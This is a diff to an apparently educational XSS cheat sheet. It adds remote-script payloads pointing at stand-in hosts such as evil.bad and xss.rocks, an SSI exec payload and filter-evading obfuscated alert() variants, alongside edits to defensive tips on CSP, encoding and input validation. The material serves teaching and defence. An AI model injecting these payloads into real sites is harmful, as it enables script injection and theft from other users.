@@ -83,6 +83,25 @@ HTML Payloads:
 Remote Download Payloads:
 
 '"/><script src="https://evil.bad/xss.js"></script>
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"
+<A HREF="http://66.102.7.147/">XSS</A
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A
+
+SSI (Server Side Includes) Payload:
+
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"--
+
+Obfuscation Payloads:
+
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top[“al”+”ert”](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top[‘al\145rt’](1)
+top[‘al\x65rt’](1)
+top[8680439..toString(30)](1)
 
 Common abused tags for XSS
 
@@ -307,19 +326,20 @@ for (var i = 0; i < document.formname.fieldname.value.length; i++) {
 
 JavaScript Regex Example - Validating a Secure Password on a registration form 
 
+Password must contain 1 small letter , 1 capitalized letter , 1 special character & must be between 12-20 characters
 ```
 "((?=.*\\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%]).{12,20})"
 ```
 
 General Tips to Avoid XSS:
 
-- Follow a well-developed SSDLC to help ensure that code gets developed according to secuirty from its foundation
+- Follow a well-developed SSDLC to help ensure that code gets developed according to secuirty guidelines
 - Use SAST / DAST & IAST tools to help identify possible code-centric security vulnerabilities
 - Make use of modern JS frameworks that are well updated & maintained
 - Understand how the web application works as well as how the code-flows after it accepts user-supplied input 
 - Follow the variables that stores user-supplied input and ensure it gets escaped , sanitized & does not get passed to dangerous code fucntions() such as eval() that could result in code execution via a child_process
 - Utilize JS libraries such as Yup / validator.js to help sanitize code 
-- Block the following characters on all search boxes on your website via HTML validation or JavaScript validation !@#$%^&*()+=-[]\\\';,./{}|\":<>?
+- Block the following characters on all search boxes / contact-us fields on your website via HTML validation or JavaScript validation !@#$%^&*()+=-[]\\\';,./{}|\":<>?
 - Enforce HTML Entity Encoding
 - Enforce HTML constraint validation
 - Enforce URL Encoding
@@ -328,7 +348,7 @@ General Tips to Avoid XSS:
 - Consider Canonicalize user-supplied input
 - Whitelist backend URL'S and make use of HTTPS for all backend systems
 - Make use of the HTTPOnly Cookie Flag 
-- Enforce a strict CSP policy to only allow whitelist domains from where javascript can be sourced from 
+- Enforce a strict CSP policy to only allow whitelist domains from where Javascript can be sourced from 
 - Implement WAF as a safety net to filter and block the majority of web application attacks
 - Implement RASP to monitor code-flow and to detected code-flow violations that could result in malicious behaviour
 - Perform red team simulations on your web application to help obtain external visibility and to test the effectiveness of your proactive security controls 
